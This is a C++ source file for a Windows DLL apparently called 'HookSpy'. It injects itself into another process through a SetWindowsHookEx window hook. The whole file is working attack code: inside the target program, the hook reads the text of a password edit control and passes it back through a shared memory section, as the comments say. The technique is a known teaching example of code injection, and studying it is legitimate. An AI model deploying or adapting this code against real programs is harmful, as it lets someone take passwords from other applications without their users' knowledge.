#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers

// Including SDKDDKVer.h defines the highest available Windows platform.
#include <SDKDDKVer.h>

// Windows Header Files:
#include <windows.h>

// Project files:
#include "Hook.h"



//-------------------------------------------------------
// shared data 
// Notice:	seen by both: the instance of "HookSpy.dll" mapped
//			into the remote process as well as by the instance
//			of "HookSpy.dll" mapped into our "HookSpy.exe"
#pragma data_seg (".shared")
HWND	g_hWnd	= 0;		// control containing the password
HHOOK	g_hHook = 0;
UINT	WM_HOOKSPY = 0;
char	g_szPassword [128] = { '\0' };
#pragma data_seg ()

#pragma comment(linker,"/SECTION:.shared,RWS") 


//-------------------------------------------------------
// global variables (unshared!)
//
HINSTANCE hDll;

//-------------------------------------------------------
// DllMain
//
BOOL APIENTRY DllMain( HANDLE hModule, 
                       DWORD  ul_reason_for_call, 
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }

    hDll = (HINSTANCE) hModule;
    return TRUE;
}


//-------------------------------------------------------
// HookProc
// Notice: - executed by the "remote" instance of "HookSpy.dll";
//		   - unhooks itself right after it gets the password;
//
#define pCW ((CWPSTRUCT*)lParam)

LRESULT HookProc (
  int code,       // hook code
  WPARAM wParam,  // virtual-key code
  LPARAM lParam   // keystroke-message information
)
{	
    if( pCW->message == WM_HOOKSPY ) {
        ::MessageBeep(MB_OK);
        ::SendMessage( g_hWnd,WM_GETTEXT,128,(LPARAM)g_szPassword );
        ::UnhookWindowsHookEx( g_hHook );
    }

    return ::CallNextHookEx(g_hHook, code, wParam, lParam);
}


//-------------------------------------------------------
// GetWindowTextRemote
// Notice: - injects "HookSpy.dll" into the remote process 
//			 (via SetWindowsHookEx);
//		   - gets the password from the remote edit control;
//
//	Return value: - number of characters retrieved 
//					by remote WM_GETTEXT;
//
int GetWindowTextRemote(HWND hWnd, LPSTR lpString)
{	
    g_hWnd = hWnd;

    // Hook the thread, that "owns" our PWD control
    g_hHook = SetWindowsHookEx( WH_CALLWNDPROC,(HOOKPROC)HookProc,
                                hDll, GetWindowThreadProcessId(hWnd,NULL) );
    if( g_hHook==NULL ) {
        lpString[0] = '\0';
        return 0;
    }
    
    if (WM_HOOKSPY == NULL)
        WM_HOOKSPY = ::RegisterWindowMessageA( "WM_HOOKSPY_RK" );

    // By the time SendMessage returns, 
    // g_szPassword already contains the password	
    SendMessage( hWnd,WM_HOOKSPY,0,0 );
    strcpy( lpString,g_szPassword );

    return strlen(lpString);
}
